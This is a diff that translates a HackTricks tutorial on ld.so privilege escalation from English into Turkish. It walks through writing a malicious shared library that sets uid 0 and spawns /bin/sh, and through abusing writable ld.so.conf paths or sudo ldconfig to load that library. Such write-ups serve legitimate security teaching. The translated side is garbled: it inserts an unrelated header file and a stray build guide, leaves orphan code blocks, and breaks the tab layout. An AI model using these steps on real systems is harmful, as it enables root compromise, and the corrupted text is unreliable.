@@ -1,22 +1,22 @@
-# ld.so privesc exploit example
+# ld.so ayrıcalık yükseltme örneği
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> öğrenin!</strong></summary>
 
-Other ways to support HackTricks:
+HackTricks'i desteklemenin diğer yolları:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Şirketinizi HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
+* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
+* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
+* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
+* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.
 
 </details>
 
-## Prepare the environment
+## Ortamı hazırlayın
 
-In the following section you can find the code of the files we are going to use to prepare the environment
+Aşağıdaki bölümde, ortamı hazırlamak için kullanacağımız dosyaların kodunu bulabilirsiniz
 
 {% tabs %}
 {% tab title="sharedvuln.c" %}
@@ -25,65 +25,112 @@ In the following section you can find the code of the files we are going to use 
 #include "libcustom.h"
 
 int main(){
-    printf("Welcome to my amazing application!\n");
-    vuln_func();
-    return 0;
+printf("Welcome to my amazing application!\n");
+vuln_func();
+return 0;
 }
 ```
-{% endtab %}
-
 {% tab title="libcustom.h" %}
+
+Bu dosya, özel bir kütüphane olan libcustom'un başlık dosyasıdır. Bu kütüphane, özel işlevler ve özellikler sağlamak için kullanılır.
+
+```c
+#ifndef LIBCUSTOM_H
+#define LIBCUSTOM_H
+
+// Özel işlevlerin prototipleri burada tanımlanır
+void customFunction1();
+void customFunction2();
+
+// Özel yapıların tanımları burada yer alır
+typedef struct {
+    int customField1;
+    char customField2[20];
+} CustomStruct;
+
+#endif
+```
+
+Bu başlık dosyası, libcustom kütüphanesini kullanacak olan diğer programlar tarafından dahil edilir. Bu sayede, libcustom'un sağladığı işlevler ve yapılar kullanılabilir hale gelir.
+
+{% endtab %}
 ```c
 #include <stdio.h>
 
 void vuln_func();
 ```
-{% endtab %}
-
 {% tab title="libcustom.c" %}
+
+Bu örnek, bir özel kütüphanenin nasıl yüklenip kullanılacağını göstermektedir. Aşağıdaki adımları izleyerek bu örneği uygulayabilirsiniz:
+
+1. Öncelikle, `libcustom.c` adında bir C dosyası oluşturun.
+2. Ardından, aşağıdaki kodu `libcustom.c` dosyasına yapıştırın:
+
+```c
+#include <stdio.h>
+
+void custom_function() {
+    printf("This is a custom function\n");
+}
+```
+
+3. Daha sonra, `libcustom.c` dosyasını derlemek için aşağıdaki komutu kullanın:
+
+```bash
+gcc -shared -o libcustom.so libcustom.c
+```
+
+4. Bu komut, `libcustom.c` dosyasını `libcustom.so` adında bir paylaşılan nesne dosyasına derleyecektir.
+5. Son olarak, `ld.so.conf` dosyasına aşağıdaki satırı ekleyin:
+
+```
+/usr/local/lib
+```
+
+Bu satır, `/usr/local/lib` dizinini paylaşılan kütüphane arama yoluna ekleyecektir.
+
+6. Artık `libcustom.so` dosyasını `/usr/local/lib` dizinine taşıyabilirsiniz.
+
+Bu adımları tamamladıktan sonra, `libcustom.so` dosyasını kullanarak özel bir işlevi çağırabilirsiniz.
 ```c
 #include <stdio.h>
 
 void vuln_func()
 {
-    puts("Hi");
+puts("Hi");
 }
 ```
+{% tabs %}
+{% tab title="Bir örnek" %}
+1. Bu dosyaları aynı klasöre **oluşturun**
+2. **Kütüphaneyi derleyin**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
+3. `libcustom.so` dosyasını `/usr/lib` dizinine **kopyalayın**: `sudo cp libcustom.so /usr/lib` (root yetkisi gerektirir)
+4. **Yürütülebilir dosyayı derleyin**: `gcc sharedvuln.c -o sharedvuln -lcustom`
+
+### Ortamı kontrol edin
+
+_libcustom.so_'nun _/usr/lib_ dizininden **yüklenip yüklenmediğini** ve ikili dosyayı **çalıştırabildiğinizi** kontrol edin.
 {% endtab %}
 {% endtabs %}
-
-1. **Create** those files in your machine in the same folder
-2. **Compile** the **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
-3. **Copy** `libcustom.so` to `/usr/lib`: `sudo cp libcustom.so /usr/lib` (root privs)
-4. **Compile** the **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`
-
-### Check the environment
-
-Check that _libcustom.so_ is being **loaded** from _/usr/lib_ and that you can **execute** the binary.
-
 ```
 $ ldd sharedvuln
-	linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
-	libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
-	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
-	/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)
-	
-$ ./sharedvuln 
+linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
+libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
+libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
+/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)
+
+$ ./sharedvuln
 Welcome to my amazing application!
 Hi
 ```
+## Sızma
 
-## Exploit
-
-In this scenario we are going to suppose that **someone has created a vulnerable entry** inside a file in _/etc/ld.so.conf/_:
-
+Bu senaryoda, _/etc/ld.so.conf/_ içinde bir dosyada **birisi zafiyetli bir giriş oluşturduğunu varsayacağız**:
 ```bash
 sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
 ```
-
-The vulnerable folder is _/home/ubuntu/lib_ (where we have writable access).\
-**Download and compile** the following code inside that path:
-
+Zararlı klasör _/home/ubuntu/lib_ (yazma erişimine sahip olduğumuz yer) içindedir.\
+Aşağıdaki kodu indirin ve o yolu içinde derleyin:
 ```c
 //gcc -shared -o libcustom.so -fPIC libcustom.c
 
@@ -92,91 +139,81 @@ The vulnerable folder is _/home/ubuntu/lib_ (where we have writable access).\
 #include <sys/types.h>
 
 void vuln_func(){
-    setuid(0);
-    setgid(0);
-    printf("I'm the bad library\n");
-    system("/bin/sh",NULL,NULL);
+setuid(0);
+setgid(0);
+printf("I'm the bad library\n");
+system("/bin/sh",NULL,NULL);
 }
 ```
+Şimdi, **hatalı yapılandırılmış** yolun içine **zararlı libcustom kütüphanesini oluşturduğumuza** göre, bir **yeniden başlatma** veya kök kullanıcının **`ldconfig`**'u çalıştırmasını beklememiz gerekiyor (_bu ikiliyi **sudo** olarak çalıştırabilir veya **suid bit**'e sahipse kendiniz çalıştırabilirsiniz_).
 
-Now that we have **created the malicious libcustom library inside the misconfigured** path, we need to wait for a **reboot** or for the root user to execute **`ldconfig`** (_in case you can execute this binary as **sudo** or it has the **suid bit** you will be able to execute it yourself_).
-
-Once this has happened **recheck** where is the `sharevuln` executable loading the `libcustom.so` library from:
-
+Bu gerçekleştiğinde, `sharevuln` yürütülebilir dosyasının `libcustom.so` kütüphanesini nereden yüklediğini **yeniden kontrol edin**:
 ```c
 $ldd sharedvuln
-	linux-vdso.so.1 =>  (0x00007ffeee766000)
-	libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
-	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
-	/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
+linux-vdso.so.1 =>  (0x00007ffeee766000)
+libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
+libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
+/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
 ```
-
-As you can see it's **loading it from `/home/ubuntu/lib`** and if any user executes it, a shell will be executed:
-
+Gördüğünüz gibi, **`/home/ubuntu/lib`'den yükleniyor** ve herhangi bir kullanıcı tarafından çalıştırılırsa bir kabuk çalıştırılacak:
 ```c
-$ ./sharedvuln 
+$ ./sharedvuln
 Welcome to my amazing application!
 I'm the bad library
 $ whoami
 ubuntu
 ```
-
 {% hint style="info" %}
-Note that in this example we haven't escalated privileges, but modifying the commands executed and **waiting for root or other privileged user to execute the vulnerable binary** we will be able to escalate privileges.
+Bu örnekte ayrıcalıkları yükseltmedik, ancak komutları değiştirerek ve **kök veya diğer ayrıcalıklı kullanıcının zafiyetli ikiliyi çalıştırmasını bekleyerek** ayrıcalıkları yükseltebiliriz.
 {% endhint %}
 
-### Other misconfigurations - Same vuln
+### Diğer yanlış yapılandırmalar - Aynı zafiyet
 
-In the previous example we faked a misconfiguration where an administrator **set a non-privileged folder inside a configuration file inside `/etc/ld.so.conf.d/`**.\
-But there are other misconfigurations that can cause the same vulnerability, if you have **write permissions** in some **config file** inside `/etc/ld.so.conf.d`s, in the folder `/etc/ld.so.conf.d` or in the file `/etc/ld.so.conf` you can configure the same vulnerability and exploit it.
+Önceki örnekte, bir yönetici **`/etc/ld.so.conf.d/` içindeki bir yapılandırma dosyasında ayrıcalıklı olmayan bir klasör ayarladığımızı taklit ettik**.\
+Ancak, aynı zafiyeti oluşturabilecek diğer yanlış yapılandırmalar da vardır, eğer `/etc/ld.so.conf.d` klasörü içinde veya `/etc/ld.so.conf` dosyasında bazı **yazma izinleriniz** varsa veya `/etc/ld.so.conf.d` içindeki **bir yapılandırma dosyasında**, aynı zafiyeti yapılandırabilir ve sömürebilirsiniz.
 
-## Exploit 2
+## Sömürü 2
 
-**Suppose you have sudo privileges over `ldconfig`**.\
-You can indicate `ldconfig` **where to load the conf files from**, so we can take advantage of it to make `ldconfig` load arbitrary folders.\
-So, lets create the files and folders needed to load "/tmp":
-
+**`ldconfig` üzerinde sudo ayrıcalıklarınız olduğunu varsayalım**.\
+`ldconfig`'a **hangi yapılandırma dosyalarını yükleyeceğini** belirtebilirsiniz, bu nedenle `ldconfig`'un keyfi klasörleri yüklemesinden yararlanmak için "/tmp" klasörünü yüklemek için gerekli dosya ve klasörleri oluşturalım:
 ```bash
 cd /tmp
 echo "include /tmp/conf/*" > fake.ld.so.conf
 echo "/tmp" > conf/evil.conf
 ```
-
-Now, as indicated in the **previous exploit**, **create the malicious library inside `/tmp`**.\
-And finally, lets load the path and check where is the binary loading the library from:
-
+Şimdi, **önceki saldırıda** belirtildiği gibi, **`/tmp` içinde zararlı bir kütüphane oluşturun**.\
+Ve son olarak, yolu yükleyelim ve binary'nin kütüphaneyi nereden yüklediğini kontrol edelim:
 ```bash
 ldconfig -f fake.ld.so.conf
 
 ldd sharedvuln
-	linux-vdso.so.1 =>  (0x00007fffa2dde000)
-	libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
-	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
-	/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
+linux-vdso.so.1 =>  (0x00007fffa2dde000)
+libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
+libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
+/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
 ```
-
-**As you can see, having sudo privileges over `ldconfig` you can exploit the same vulnerability.**
+**Görüldüğü gibi, `ldconfig` üzerinde sudo yetkilerine sahip olmak aynı zafiyeti sömürmenizi sağlar.**
 
 {% hint style="info" %}
-I **didn't find** a reliable way to exploit this vuln if `ldconfig` is configured with the **suid bit**. The following error appear: `/sbin/ldconfig.real: Can't create temporary cache file /etc/ld.so.cache~: Permission denied`
+Eğer `ldconfig` suid bitiyle yapılandırılmışsa, bu zafiyeti sömürmek için güvenilir bir yol bulamadım. Aşağıdaki hata görüntülenir: `/sbin/ldconfig.real: Can't create temporary cache file /etc/ld.so.cache~: Permission denied`
 {% endhint %}
 
-## References
+## Referanslar
 
 * [https://www.boiteaklou.fr/Abusing-Shared-Libraries.html](https://www.boiteaklou.fr/Abusing-Shared-Libraries.html)
 * [https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2](https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2)
-* Dab machine in HTB
+* HTB'deki Dab makinesi
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+HackTricks'i desteklemenin diğer yolları:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Şirketinizi HackTricks'te **reklamınızı yapmak veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
+* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
+* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keşfedin
+* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'da takip edin.**
+* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek** paylaşın.
 
 </details>
